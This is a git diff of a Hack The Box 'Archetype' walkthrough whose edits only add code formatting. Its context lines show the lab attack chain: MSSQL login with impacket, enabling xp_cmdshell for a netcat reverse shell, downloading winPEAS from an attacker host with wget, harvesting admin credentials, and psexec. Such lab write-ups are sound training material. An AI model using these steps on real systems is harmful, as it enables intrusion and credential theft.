@@ -29,7 +29,7 @@
 
 ## MS SQL Client
 
-- Mssqlclient.py script from impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server. Since the credentials for the share has been acquired, locate and access MS SQL Client:
+- `Mssqlclient.py` script from impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server. Since the credentials for the share has been acquired, locate and access MS SQL Client:
 	* `locate mssqlclient`
 	* `/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.16.28 -windows -auth`
 	* Password: `M3g4c0rp123`
@@ -38,7 +38,7 @@
 
 ## XP Command Shell
 
-- Xp_cmdshell extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell. Enable the xp_cmdshell, upload an Netcat listener and a reverse shell to establish a direct command line access.
+- `Xp_cmdshell` extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell. Enable the xp_cmdshell, upload an Netcat listener and a reverse shell to establish a direct command line access.
 		* `help`
 		* `enable xp_cmdshell`
 		* `RECONFIGURE ;`
@@ -60,14 +60,14 @@
 
 ## winPEAS
 
-* WinPEAS script can be used in order to search possible paths to escalate privileges on Windows hosts. Since there is no access to the Admin directory, winPEAS will be used to acquire the admin credentials.
+* `WinPEAS script` can be used in order to search possible paths to escalate privileges on Windows hosts. Since there is no access to the Admin directory, winPEAS will be used to acquire the admin credentials.
 	* Enter `powershell` 
 	* `wget http://10.10.16.233/winPEASx64.exe -outfile winPEAS.exe`
 	* Run `.\winPEAS.exe`
 			
 	![Diagram](https://github.com/aele1401/HacktheBox/blob/main/Archetype/Images/winpeas.png)
 
-	* ConsoleHost_history.txt contains the admin password. Locate the Administrative credentials, copy and paste credentials into Kali.
+	* `ConsoleHost_history.txt` contains the admin password. Locate the Administrative credentials, copy and paste credentials into Kali.
 	* In Kali, enter `locate psexec`
 	* Enter `/usr/bin/impacket-psexec administrator@10.129.181.76`
 	* Enter password 
